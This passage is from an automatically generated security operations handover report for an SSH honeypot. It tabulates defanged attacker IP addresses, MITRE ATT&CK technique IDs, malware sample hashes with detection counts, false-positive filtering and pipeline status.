| `183.220.227[.]73` | 1 | 2026-03-14 05:21 | 2026-03-14 05:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.237.33[.]162` | 1 | 2026-03-14 02:11 | 2026-03-14 02:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.56.179[.]201` | 1 | 2026-03-14 00:01 | 2026-03-14 00:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.106.79[.]211` | 1 | 2026-03-14 01:14 | 2026-03-14 01:15 | 31s | 0 | `T1592` | 🟢 LOW |
| `211.20.26[.]201` | 1 | 2026-03-14 14:22 | 2026-03-14 14:22 | 14s | 0 | `T1592` | 🟢 LOW |
| `216.236.215[.]9` | 1 | 2026-03-14 13:24 | 2026-03-14 13:24 | 20s | 0 | `T1592` | 🟢 LOW |
| `220.249.186[.]9` | 1 | 2026-03-14 12:09 | 2026-03-14 12:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.124.61[.]177` | 1 | 2026-03-14 14:53 | 2026-03-14 14:53 | 5s | 0 | `T1592` | 🟢 LOW |
| `223.48.1[.]189` | 1 | 2026-03-14 13:31 | 2026-03-14 13:31 | 31s | 0 | `T1592` | 🟢 LOW |
| `3.81.224[.]7` | 1 | 2026-03-14 12:55 | 2026-03-14 12:55 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.239.202[.]205` | 1 | 2026-03-14 08:39 | 2026-03-14 08:39 | 31s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]15` | 1 | 2026-03-14 13:54 | 2026-03-14 13:54 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.151[.]47` | 1 | 2026-03-14 14:01 | 2026-03-14 14:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]59` | 1 | 2026-03-14 00:54 | 2026-03-14 00:54 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-03-14 09:54 | 2026-03-14 09:55 | 73s | 0 | `T1592` | 🟢 LOW |
| `59.92.51[.]186` | 1 | 2026-03-14 04:27 | 2026-03-14 04:27 | 11s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.154.211[.]39` | 1 | 2026-03-14 09:41 | 2026-03-14 09:42 | 30s | 0 | `T1592` | 🟢 LOW |
| `8.219.165[.]42` | 1 | 2026-03-14 09:49 | 2026-03-14 09:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.222.159[.]179` | 1 | 2026-03-14 05:41 | 2026-03-14 05:42 | 30s | 0 | `T1592` | 🟢 LOW |
| `89.107.98[.]108` | 1 | 2026-03-14 13:40 | 2026-03-14 13:40 | 13s | 0 | `T1592` | 🟢 LOW |
| `92.203.165[.]140` | 1 | 2026-03-14 16:03 | 2026-03-14 16:05 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (3 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `183.171.12[.]224` | MY | Celcom Axiata Berhad | **100** ⚠️ | 10 |
| `59.92.51[.]186` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 19 |
| `8.219.165[.]42` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 17 |
| `68.183.86[.]77` | IN | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `153.246.198[.]45` | JP | Open Computer Network | **100** ⚠️ | 30 |
| `179.33.186[.]150` | CO | COLOMBIA TELECOMUNICACIONES S.A. ESP | **100** ⚠️ | 19 |
| `220.249.186[.]9` | CN | FJFZ-JiaYunWangWeiTech-Corp | **100** ⚠️ | 12 |
| `183.237.33[.]162` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `180.166.162[.]78` | CN | CHINANET SHANGHAI PROVINCE NETWORK | **100** ⚠️ | 32 |
| `78.154.211[.]39` | KW | Qualitynet Co. | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | — |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | — |
| [T1078](https://attack.mitre.org/techniques/T1078) | — |
| [T1083](https://attack.mitre.org/techniques/T1083) | — |
| [T1105](https://attack.mitre.org/techniques/T1105) | — |

---

## 🔕 False Positive Summary (383 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 50 |
| AbuseIPDB score 12 below threshold 25 | 134 |
| AbuseIPDB score 14 below threshold 25 | 8 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 5 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 48 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 130 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05 | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26 | Incident Timeline Generator | ✅ 652 session(s) |
| Tool 27 | Threat Intel Feeder         | ✅ 165 IP(s) enriched |
| Tool 29 | False Positive Tracker      | ✅ 383 filtered (58.7%) |
| Tool 30 | Metric Exporter             | ✅ stats.json written |
| Tool 31 | Malware Analyzer            | ✅ 3 file(s) analyzed |
| Tool 28 | SOC Handover Report         | ✅ This report |

> **Report grouping:** 41 priority case(s) shown individually · 84 recon entry/entries in table (22 group(s) consolidating 166 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.1 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-14T16:28:54Z_
